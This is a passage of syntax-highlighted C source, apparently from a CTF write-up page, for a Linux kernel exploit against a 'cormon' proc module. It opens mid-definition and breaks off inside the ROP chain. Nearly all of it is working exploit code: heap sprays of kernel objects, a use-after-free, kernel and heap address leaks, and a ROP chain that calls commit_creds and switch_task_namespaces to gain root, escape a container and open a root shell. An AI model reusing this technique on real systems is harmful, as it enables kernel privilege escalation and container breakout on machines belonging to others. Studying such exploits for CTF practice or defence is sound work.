0xffffffff8101f89c</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PUSH_RCX_POP_RBX 0xffffffff8142c457</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MOV_RAX_RBX_POP_4 0xffffffff817a6b69</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PRINT_ADDR(str, x) printf(<span class="hljs-string">&quot;\033[0m\033[1;34m[+]%s \033[0m:0x%lx\n&quot;</span>, str, x)</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">info_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>	 <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;32m[+]%s\033[0m\n&quot;</span>,str);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">error_log</span><span class="hljs-params">(<span class="hljs-type">char</span>* str)</span>&#123;<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[0m\033[1;31m[x]%s\033[0m\n&quot;</span>,str);<br>  <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">size_t</span> user_cs, user_ss,user_rflags,user_sp;<br><br><span class="hljs-comment">//int fd = 0;        // file pointer of process &#x27;core&#x27;</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">saveStatus</span><span class="hljs-params">()</span>&#123;<br>  __asm__(<span class="hljs-string">&quot;mov user_cs, cs;&quot;</span><br>          <span class="hljs-string">&quot;mov user_ss, ss;&quot;</span><br>          <span class="hljs-string">&quot;mov user_sp, rsp;&quot;</span><br>          <span class="hljs-string">&quot;pushf;&quot;</span><br>          <span class="hljs-string">&quot;pop user_rflags;&quot;</span><br>          );<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;\033[34m\033[1m[+]Status has been saved . \033[0m&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">get_root</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">if</span>(!getuid())&#123;<br>        info_log(<span class="hljs-string">&quot;Congratulation! We Win!!!&quot;</span>);<br>        system(<span class="hljs-string">&quot;/bin/bash&quot;</span>);<br>    &#125;<br>    error_log(<span class="hljs-string">&quot;get root failed!&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">debug</span><span class="hljs-params">()</span>&#123;<br>    info_log(<span class="hljs-string">&quot;Debugging here!&quot;</span>);<br>    getchar();<br>&#125;<br><br><span class="hljs-type">pthread_mutex_t</span> mutex = PTHREAD_MUTEX_INITIALIZER;<br><span class="hljs-type">pthread_t</span> poll_tid[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> fds[<span class="hljs-number">0x100</span>];  <span class="hljs-comment">//monitor target fd</span><br><span class="hljs-type">int</span> poll_threads;<br><span class="hljs-type">size_t</span> kernel_offset;<br><span class="hljs-type">size_t</span> kernel_base;<br><span class="hljs-type">size_t</span> page_offset_base;<br><span class="hljs-type">int</span> key_id[<span class="hljs-number">0x1000</span>];<br><span class="hljs-type">int</span> seq_id[SEQ_SPRAY_NR + <span class="hljs-number">128</span>];<br><span class="hljs-type">int</span> ptmx_id[TTY_SPRAY_NR];<br><span class="hljs-type">int</span> pipe_id[<span class="hljs-number">0x400</span>][<span class="hljs-number">2</span>];<br><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_args</span>&#123;</span><br>    <span class="hljs-type">int</span> t_id;           <span class="hljs-comment">//thread_id</span><br>    <span class="hljs-type">int</span> size;           <span class="hljs-comment">//the size you want to allocated</span><br>    <span class="hljs-type">int</span> timeout;<br>    <span class="hljs-type">int</span> hang;<br>&#125;;<br><br><br><span class="hljs-comment">/* to run the exp on the specific core only */</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span><br>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    <span class="hljs-keyword">if</span>(sched_setaffinity(getpid(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;bind core failed..&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">bind_thread_core</span><span class="hljs-params">(<span class="hljs-type">int</span> core)</span>&#123;<br>    <span class="hljs-type">cpu_set_t</span> cpu_set;<br>    CPU_ZERO(&amp;cpu_set);<br>    CPU_SET(core, &amp;cpu_set);<br>    <span class="hljs-keyword">if</span>(pthread_setaffinity_np(pthread_self(), <span class="hljs-keyword">sizeof</span>(cpu_set), &amp;cpu_set) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;bind core failed...&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> *<span class="hljs-title function_">alloc_poll_list</span><span class="hljs-params">(<span class="hljs-type">void</span> *args)</span>&#123;<br>    <br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pollfd</span> *<span class="hljs-title">pfds</span>;</span><br>    <span class="hljs-type">int</span> id, want_size, timeout, nfds, hang;<br>    id = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;t_id;<br>    want_size = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;size;<br>    timeout = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;timeout;<br>    hang = ((<span class="hljs-keyword">struct</span> poll_args *)args)-&gt;hang;<br>    <br>    <span class="hljs-comment">/* nfds need modify :) */</span><br>    want_size = want_size - ((want_size/PAGE_SIZE)+<span class="hljs-number">1</span>)*POLL_LIST_SIZE;<br>    nfds = (N_STACK_PPS + want_size)/POLLFD_SIZE;<br>    <br>    pfds = <span class="hljs-built_in">calloc</span>(nfds, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pollfd));<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; nfds; i++)&#123;<br>        pfds[i].fd = fds[<span class="hljs-number">0</span>];<br>        pfds[i].events = POLLERR;<br>    &#125;<br>    bind_thread_core(<span class="hljs-number">0</span>);<br>    pthread_mutex_lock(&amp;mutex);<br>    poll_threads++;<br>    pthread_mutex_unlock(&amp;mutex);<br>    poll(pfds, nfds, timeout);<br>    bind_thread_core(<span class="hljs-number">1</span>);<br>    <br>    <span class="hljs-keyword">if</span>(hang)&#123;<br>        pthread_mutex_lock(&amp;mutex);<br>        poll_threads--;<br>        pthread_mutex_unlock(&amp;mutex);<br>        <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;&#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">NULL</span>;<br>&#125;<br><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">create_poll_thread</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">size_t</span> size, <span class="hljs-type">int</span> timeout, <span class="hljs-type">int</span> hang)</span>&#123;<br>    <span class="hljs-type">int</span> judge;<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">poll_args</span> *<span class="hljs-title">args</span>;</span><br>    <span class="hljs-keyword">if</span>(id &lt; <span class="hljs-number">0</span> || size &lt; <span class="hljs-number">0</span> || timeout &lt; <span class="hljs-number">0</span>)&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: Wrong argument!&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    <br>    <span class="hljs-comment">/* Include the poll_list head */</span><br>    <span class="hljs-keyword">if</span>(!(size%PAGE_SIZE == <span class="hljs-number">0</span> || size%PAGE_SIZE &gt; <span class="hljs-number">0x10</span>))&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[x]create_poll_thread: size you want have to be suitable!\n&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    args = <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> poll_args));<br>    <span class="hljs-keyword">if</span>(args == <span class="hljs-literal">NULL</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Calloc faield!&quot;</span>);<br>    &#125;<br>    args-&gt;t_id = id;<br>    args-&gt;size = size;<br>    args-&gt;timeout = timeout;<br>    args-&gt;hang = hang;<br>    <br>    <span class="hljs-keyword">if</span>(pthread_create(&amp;poll_tid[id], <span class="hljs-literal">NULL</span>, alloc_poll_list, args) != <span class="hljs-number">0</span>)&#123;<br>        perror(<span class="hljs-string">&quot;pthread created failed&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>&#125;<br><span class="hljs-type">void</span> <span class="hljs-title function_">join_poll_threads</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; poll_threads; i++ )&#123;<br>        pthread_join(poll_tid[i], <span class="hljs-literal">NULL</span>);<br>    &#125;<br>    poll_threads = <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * User_key_payload </span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">key_alloc</span><span class="hljs-params">(<span class="hljs-type">char</span>* description, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>	<span class="hljs-keyword">return</span> syscall(__NR_add_key, <span class="hljs-string">&quot;user&quot;</span>, description, payload, plen, KEY_SPEC_PROCESS_KEYRING);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_update</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UPDATE, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_revoke</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_REVOKE, id, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_read</span><span class="hljs-params">(<span class="hljs-type">int</span> id, <span class="hljs-type">void</span>* payload, <span class="hljs-type">size_t</span> plen)</span>&#123;<br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_READ, id, payload, plen, <span class="hljs-literal">NULL</span>);<br>&#125;<br><span class="hljs-type">int</span> <span class="hljs-title function_">key_unlink</span><span class="hljs-params">(<span class="hljs-type">int</span> id)</span>&#123;                                                                             <br>  <span class="hljs-keyword">return</span> syscall(__NR_keyctl, KEYCTL_UNLINK, id, KEY_SPEC_PROCESS_KEYRING, <span class="hljs-literal">NULL</span>, <span class="hljs-literal">NULL</span>);<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment"> * seq_operations alloc</span><br><span class="hljs-comment"> * */</span><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_seq_op</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-keyword">return</span> open(<span class="hljs-string">&quot;/proc/self/stat&quot;</span>, O_RDONLY);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">init_fds</span><span class="hljs-params">()</span>&#123;<br>    fds[<span class="hljs-number">0</span>] = open(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span>(fds[<span class="hljs-number">0</span>] &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;open /etc/passwd failed&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_kernel_addr</span><span class="hljs-params">(<span class="hljs-type">char</span> *buff)</span>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>; <br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        <span class="hljs-keyword">if</span>(((<span class="hljs-type">size_t</span> *)buff)[idx] &gt;= PROC_SINGLE_SHOW )&#123;<br>            kernel_offset = ((<span class="hljs-type">size_t</span> *)buff)[idx] - PROC_SINGLE_SHOW;<br>            kernel_base = kernel_offset + <span class="hljs-number">0xffffffff81000000</span>;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>        &#125;<br>        idx++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">leak_heap_addr</span><span class="hljs-params">(<span class="hljs-type">char</span> *buff)</span>&#123;<br>    <span class="hljs-type">int</span> idx = <span class="hljs-number">0</span>; <br>    <span class="hljs-type">size_t</span> tmp_addr;<br>    <span class="hljs-keyword">while</span>(<span class="hljs-number">1</span>)&#123;<br>        tmp_addr = ((<span class="hljs-type">size_t</span> *)buff)[idx];<br>        <span class="hljs-keyword">if</span>(((tmp_addr &amp; HEAP_MASK) == HEAP_MASK)&amp;&amp;((tmp_addr &amp; KERNEL_MASK) != KERNEL_MASK)&amp;&amp;((tmp_addr &amp; VMMAP_MASK) != VMMAP_MASK))&#123;<br>            page_offset_base = ((<span class="hljs-type">size_t</span> *)buff)[idx];<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <br>        &#125;<br>        idx++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">alloc_pipe_buffer</span><span class="hljs-params">(<span class="hljs-type">int</span> i)</span>&#123;<br>    <span class="hljs-keyword">if</span>(pipe(pipe_id[i]) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Alloc pipe buffer failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(write(pipe_id[i][<span class="hljs-number">1</span>], <span class="hljs-string">&quot;XXXXX&quot;</span>, <span class="hljs-number">5</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;write to pipe buffer failed&quot;</span>);<br>    &#125;<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">char</span> description[<span class="hljs-number">0x100</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> data[<span class="hljs-number">0x1000</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">char</span> buff[<span class="hljs-number">0x600</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">int</span> proc_fd;<br>    <span class="hljs-type">int</span> victim_key_idx = <span class="hljs-number">-1</span>;<br>    <span class="hljs-type">size_t</span> fake_ops;<br>    <span class="hljs-type">size_t</span> *magic_rop;<br>    <br>    init_fds();<br>    proc_fd = open(<span class="hljs-string">&quot;/proc_rw/cormon&quot;</span>, O_RDWR); <br>   <br>    info_log(<span class="hljs-string">&quot;Step I: Bind the core_0 and Save Status&quot;</span>);<br>    bind_core(<span class="hljs-number">0</span>);        <br>    saveStatus();<br><br><br>    info_log(<span class="hljs-string">&quot;Step II: Spraying the 0x20 seq_operations for cleaning the slab...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; SEQ_SPRAY_NR; i++)&#123;<br>        seq_id[i] = alloc_seq_op();<br>        <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step III: Spraying part of the 0x20 user_key_payload...&quot;</span>);<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">72</span>; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br><br>    info_log(<span class="hljs-string">&quot;Step IV: Spraying the poll_list in type 4096+32...&quot;</span>);<br>    bind_core(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">14</span>; i++)&#123;<br>        create_poll_thread(i, <span class="hljs-number">4096</span>+<span class="hljs-number">32</span>, <span class="hljs-number">3000</span>, <span class="hljs-number">0</span>);<br>    &#125;<br>    bind_core(<span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">14</span>)&#123;&#125;;<br><br>    sleep(<span class="hljs-number">1</span>);<br>    info_log(<span class="hljs-string">&quot;Step V: Spraying remain of the 0x20 user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">72</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125;  <br><br>    info_log(<span class="hljs-string">&quot;Step VI: Insert the proc_rw/cormons&#x27;s 4096 object and free random one user_key_payload..&quot;</span>);<br>    write(proc_fd, data, <span class="hljs-number">4096</span>); <br>    join_poll_threads();<br>    <br>    info_log(<span class="hljs-string">&quot;Step VII: Construct UAF by seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>        seq_id[i] = alloc_seq_op();<br>        <span class="hljs-keyword">if</span>(seq_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Allocate the seq_operations failed&quot;</span>);<br>        &#125;<br>    &#125;<br>    <br>    info_log(<span class="hljs-string">&quot;Step VIII: OOB read for leaking the kernel address...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(key_read(key_id[i], data, <span class="hljs-number">0x1000</span>) &gt; <span class="hljs-number">0x10</span>)&#123;<br>            victim_key_idx = i;<br>            <span class="hljs-keyword">break</span>;<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(victim_key_idx == <span class="hljs-number">-1</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Unfortunatly!We do not found the victim key..&quot;</span>);<br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>        <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*]The victim key idx we found is %d\n&quot;</span>, victim_key_idx);<br>    &#125;<br>    <span class="hljs-keyword">if</span>(leak_kernel_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;Leaking kernel base failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]Congratualation!You find the kernel offset : 0x%lx\n&quot;</span>, kernel_offset);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the user_key_payloads, except the corrupted user_key_payload&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        <span class="hljs-keyword">if</span>(i == victim_key_idx) <span class="hljs-keyword">continue</span>;<br>        key_revoke(key_id[i]);<br>        key_unlink(key_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        ptmx_id[i] = open(<span class="hljs-string">&quot;/dev/ptmx&quot;</span>, O_RDWR | O_NOCTTY);<br>        <span class="hljs-keyword">if</span>(ptmx_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            error_log(<span class="hljs-string">&quot;Alloc the ptmx failed...&quot;</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">if</span>(key_read(key_id[victim_key_idx], data, <span class="hljs-number">0x1000</span>) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;read victim key failed&quot;</span>);<br>    &#125;    <br>    <span class="hljs-keyword">if</span>(leak_heap_addr(data) &lt; <span class="hljs-number">0</span>)&#123;<br>        error_log(<span class="hljs-string">&quot;leak heap base failed&quot;</span>);<br>    &#125;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[+]We found the kmalloc-1024 slab addr: 0x%lx\n&quot;</span>, page_offset_base);<br>    info_log(<span class="hljs-string">&quot;Up to now, We found those address :)&quot;</span>);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel base addr&quot;</span>, kernel_base);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel offset&quot;</span>, kernel_offset);<br>    PRINT_ADDR(<span class="hljs-string">&quot;Kernel 1024 kmalloc&quot;</span>, page_offset_base);<br>    info_log(<span class="hljs-string">&quot;Step IX: Hijack the control stream...&quot;</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free the part2 seq_operations...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = SEQ_SPRAY_NR; i &lt; SEQ_SPRAY_NR + <span class="hljs-number">128</span>; i++)&#123;<br>        close(seq_id[i]);<br>    &#125;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate 32 size poll_list...&quot;</span>);<br>    <span class="hljs-comment">/* these up will free twice the victim user_key_payload */</span><br>    bind_core(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">192</span>; i++)&#123;<br>        create_poll_thread(i, <span class="hljs-number">32</span>, <span class="hljs-number">4000</span>, <span class="hljs-number">1</span>);<br>    &#125; <br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">192</span>)&#123;&#125;;<br>    usleep(<span class="hljs-number">250000</span>);<br>    bind_core(<span class="hljs-number">0</span>);<br>    <span class="hljs-comment">/* these up will alloc twice the victim user_key_payload */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free victim user_key_payload to construct poll_list uaf...&quot;</span>);<br>    key_revoke(key_id[victim_key_idx]);<br>    key_unlink(key_id[victim_key_idx]);<br>    ((<span class="hljs-type">size_t</span> *)data)[<span class="hljs-number">0</span>] = page_offset_base - <span class="hljs-number">0x18</span>;<br>    sleep(<span class="hljs-number">1</span>); <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Allocate setxattr and user_key_payload...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; USER_KEY_PAYLOAD_SPRAY_NR; i++)&#123;<br>        setxattr(<span class="hljs-string">&quot;/home/user/.bashrc&quot;</span>, <span class="hljs-string">&quot;user.x&quot;</span>, data, <span class="hljs-number">32</span>, XATTR_CREATE);<br>        <span class="hljs-built_in">sprintf</span>(description, <span class="hljs-string">&quot;payload_%d&quot;</span>, i);<br>        <span class="hljs-built_in">memset</span>(buff, i, <span class="hljs-keyword">sizeof</span>(buff));<br>        key_id[i] = key_alloc(description, buff, <span class="hljs-number">0x8</span>);<br>        <span class="hljs-keyword">if</span>(key_id[i] &lt; <span class="hljs-number">0</span>)&#123;<br>            <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[X]key index %d id is %d\n&quot;</span>, i,key_id[i]);<br>            error_log(<span class="hljs-string">&quot;key alloc failed!&quot;</span>);<br>        &#125;<br>    &#125; <br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*]Free all the tty and alloc pipe_buffer...&quot;</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; TTY_SPRAY_NR; i++)&#123;<br>        close(ptmx_id[i]);<br>    &#125;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">0x400</span>; i++)&#123;<br>        alloc_pipe_buffer(i);<br>    &#125;<br>    <span class="hljs-keyword">while</span>(poll_threads != <span class="hljs-number">0</span>)&#123;&#125;;<br>    sleep(<span class="hljs-number">1</span>);<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[+]down!&quot;</span>);<br>    info_log(<span class="hljs-string">&quot;Step X: Construct our magic ROP :^)&quot;</span>);<br>    <span class="hljs-built_in">memset</span>(data, <span class="hljs-number">0x41</span>, <span class="hljs-keyword">sizeof</span>(data));<br>    fake_ops = page_offset_base + <span class="hljs-number">0x18</span>;   <br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0</span>]) = ADD_RSP_50_RET + kernel_offset;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x10</span>]) = fake_ops;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x20</span>]) = PUSH_RSI_JMP_RSI_39 + kernel_offset;<br>    *(<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x39</span>]) = POP_RSP_RET + kernel_offset;<br>    <br>    <span class="hljs-comment">/* ROP */</span><br>    <span class="hljs-type">size_t</span> index = <span class="hljs-number">0</span>;<br>    magic_rop = (<span class="hljs-type">size_t</span> *)&amp;(data[<span class="hljs-number">0x58</span>]);<br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0</span>;<br>    magic_rop[index++] = PREPARE_KERNEL_CRED + kernel_offset;<br>    magic_rop[index++] = MOV_RDI_RAX_RET + kernel_offset;<br>    magic_rop[index++] = COMMIT_CREDS + kernel_offset;<br>    <br>    <span class="hljs-comment">/* switch_task_namespaces(find_task_by_vpid(1), init_nsproxy) */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">1</span>;<br>    magic_rop[index++] = FIND_TASK_BY_VPID + kernel_offset;<br>    magic_rop[index++] = POP_RCX_RET + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0x1000</span>;<br>    magic_rop[index++] = MOV_RDI_RAX_RET + kernel_offset;<br>    magic_rop[index++] = POP_RSI_RET + kernel_offset;<br>    magic_rop[index++] = INIT_NSPROXY + kernel_offset;<br>    magic_rop[index++] = SWITCH_TASK_NAMESPACES + kernel_offset;<br><br>    <span class="hljs-comment">/* new_fs = copy_fs_struct(init_fs) */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = INIT_FS + kernel_offset;<br>    magic_rop[index++] = COPY_FS_STRUCT + kernel_offset;<br>    magic_rop[index++] = MOV_RCX_RAX + kernel_offset;<br>    magic_rop[index++] = PUSH_RCX_POP_RBX + kernel_offset;<br><br>    <span class="hljs-comment">/* find_task_by_vpid(getpid())-&gt;fs = new_fs */</span><br>    magic_rop[index++] = POP_RDI_RET + kernel_offset;<br>    magic_rop[index++] = getpid();<br>    magic_rop[index++] = FIND_TASK_BY_VPID + kernel_offset;<br>    magic_rop[index++] = POP_R8 + kernel_offset;<br>    magic_rop[index++] = <span class="hljs-number">0x6e0</span>;<br>    magic_rop[index++] = ADD_RAX_R8 + kernel_offset;<br>    